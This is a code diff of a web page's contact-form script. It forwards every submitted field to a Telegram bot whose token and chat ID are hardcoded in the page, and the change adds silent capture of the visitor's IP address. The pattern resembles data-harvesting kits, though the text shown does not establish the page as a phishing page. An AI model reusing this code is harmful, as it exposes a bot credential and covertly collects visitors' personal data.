@@ -112,8 +112,8 @@
   </div>
 
   <script>
-    const botToken = "7483695523:AAG6BoyFGCH6XDTDJ0wXhGlxEwlUwSYcnXA"; // Replace with your bot token
-    const chatId = "7650029381";     // Replace with your chat ID
+    const botToken = "7483695523:AAG6BoyFGCH6XDTDJ0wXhGlxEwlUwSYcnXA"; // Your bot token
+    const chatId = "7650029381"; // Your chat ID
 
     document.getElementById("contactForm").addEventListener("submit", function (e) {
       e.preventDefault();
@@ -128,20 +128,22 @@
         country: data.get("country")
       };
 
-      // Send to Telegram
-      let message = `New Contact Submission:\n\n`;
-      data.forEach((value, key) => {
-        message += `${key.replace('_', ' ')}: ${value}\n`;
-      });
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      })
+      fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
+        .then(ipData => {
+          let message = `New Contact Submission:\n\n`;
+          data.forEach((value, key) => {
+            message += `${key.replace('_', ' ')}: ${value}\n`;
+          });
+          message += `IP Address: ${ipData.ip}`;
+
+          return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+          });
+        })
         .then(() => {
-          // Redirect to profile page with query params
           const query = new URLSearchParams(userData).toString();
           window.location.href = `profile.html?${query}`;
         })
